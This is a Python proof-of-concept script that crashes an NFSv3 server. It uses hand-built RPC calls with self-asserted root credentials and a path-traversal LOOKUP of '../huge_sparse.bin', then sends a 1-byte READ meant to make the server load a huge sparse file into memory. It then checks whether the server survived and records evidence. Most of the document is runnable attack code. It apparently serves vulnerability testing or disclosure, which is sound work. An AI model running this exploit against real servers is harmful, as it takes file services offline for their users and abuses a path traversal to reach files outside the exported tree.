#!/usr/bin/env python3
"""NFSv3 crash test: LOOKUP + 1-byte READ of a huge sparse file triggers
full-file copy-up (pread of entire file into memory + delta DB write).

Demonstrates availability impact: the server may abort/OOM or stop
responding while materializing the copy. Requires no privileges beyond
reaching the NFS port; AUTH_UNIX uid/gid are self-asserted.

Usage:
  python3 nfs_crash.py --outdir out/crash --name ../huge_sparse.bin \
      --host 127.0.0.1 --port 11111
"""
import argparse
import datetime
import json
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import nfs_traversal_capture as n


def server_alive(host, port):
    """Functional liveness probe: can we open a TCP connection to the NFS port?"""
    try:
        with socket.create_connection((host, port), timeout=3):
            return True
    except OSError:
        return False


def rpc_timed(host, port, prog, proc, body, timeout, uid, gid):
    """Like n.rpc but with a socket timeout; returns (result, elapsed, error)."""
    cred = n.X().u32(1).s("poc").u32(uid).u32(gid).u32(0)
    c = n.X().u32(n.XID).u32(0).u32(2).u32(prog).u32(3).u32(proc)
    c.u32(1).op(bytes(cred.b)).u32(0).op(b"")
    msg = bytes(c.b) + bytes(body.b)
    req_record = __import__("struct").pack(">I", 0x80000000 | len(msg)) + msg
    t0 = time.time()
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(req_record)
            resp_record, resp_payload = n.recv_record(s)
        r = n.R(resp_payload)
        r.u32(); r.u32(); r.u32(); r.u32(); r.op()
        if r.u32() != 0:
            raise RuntimeError("RPC accept failed")
        return r, round(time.time() - t0, 3), None, req_record, resp_record
    except Exception as e:  # noqa: BLE001 - report any failure verbatim
        return None, round(time.time() - t0, 3), f"{type(e).__name__}: {e}", req_record, b""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--name", default="../huge_sparse.bin")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--uid", type=int, default=0)
    ap.add_argument("--gid", type=int, default=0)
    ap.add_argument("--timeout", type=float, default=60.0,
                    help="seconds to wait for the READ response")
    args = ap.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    res = {"started_utc": datetime.datetime.now(datetime.timezone.utc)
           .isoformat().replace("+00:00", "Z"),
           "host": args.host, "port": args.port, "name": args.name,
           "server_alive_before": server_alive(args.host, args.port),
           "steps": []}

    def rec(label, prog, proc, body, to=None):
        r, el, err, req, resp = rpc_timed(args.host, args.port, prog, proc,
                                          body, to or args.timeout,
                                          args.uid, args.gid)
        if req:
            n.save(outdir, len(res["steps"]) + 1, label, req, resp)
        return r, el, err

    r, el, err = rec("mnt", 100005, 1, n.X().s("/"))
    if err:
        res["steps"].append({"proc": "MNT", "error": err, "elapsed_sec": el})
        print(f"[!] MNT failed: {err}")
    else:
        st = r.u32()
        root = r.op()
        res["steps"].append({"proc": "MNT", "status": st, "elapsed_sec": el})
        print(f"[+] MNT / status={st}")

        r, el, err = rec("lookup", 100003, 3, n.X().op(root).s(args.name))
        if err:
            res["steps"].append({"proc": "LOOKUP", "error": err,
                                 "elapsed_sec": el})
            print(f"[!] LOOKUP failed: {err}")
        else:
            st = r.u32()
            if st != 0:
                res["steps"].append({"proc": "LOOKUP", "status": st,
                                     "elapsed_sec": el})
                print(f"[!] LOOKUP status={st}")
            else:
                fh = r.op()
                obj = r.attrs()
                res["steps"].append({"proc": "LOOKUP", "status": st,
                                     "file_size": obj["size"] if obj else None,
                                     "elapsed_sec": el})
                print(f"[+] LOOKUP {args.name!r} size={obj['size'] if obj else '?'}")

                t0 = time.time()
                r, el, err = rec("read", 100003, 6,
                                 n.X().op(fh).u64(0).u32(1), to=args.timeout)
                step = {"proc": "READ", "elapsed_sec": el}
                if err:
                    step["error"] = err
                else:
                    step["status"] = r.u32()
                    r.attrs()
                    step["count"] = r.u32()
                    step["eof"] = bool(r.u32())
                res["steps"].append(step)
                print(f"[+] READ -> {step}")

    # post-read liveness probes
    for i in range(3):
        alive = server_alive(args.host, args.port)
        res.setdefault("liveness", []).append(
            {"server_alive": alive})
        if alive is False:
            break
        time.sleep(2)
        # try a fresh MNT as a functional probe
        r, el, err = rec(f"probe_{i}", 100005, 1, n.X().s("/"),
                         to=min(args.timeout, 10))
        res["liveness"][-1]["mnt_probe"] = "ok" if not err else err
        if err:
            break

    res["server_alive_after"] = server_alive(args.host, args.port)
    res["finished_utc"] = datetime.datetime.now(datetime.timezone.utc) \
        .isoformat().replace("+00:00", "Z")
    (outdir / "result.json").write_text(json.dumps(res, indent=2) + "\n")
    print(json.dumps(res, indent=2))
    print(f"[+] evidence -> {outdir}")


if __name__ == "__main__":
    main()
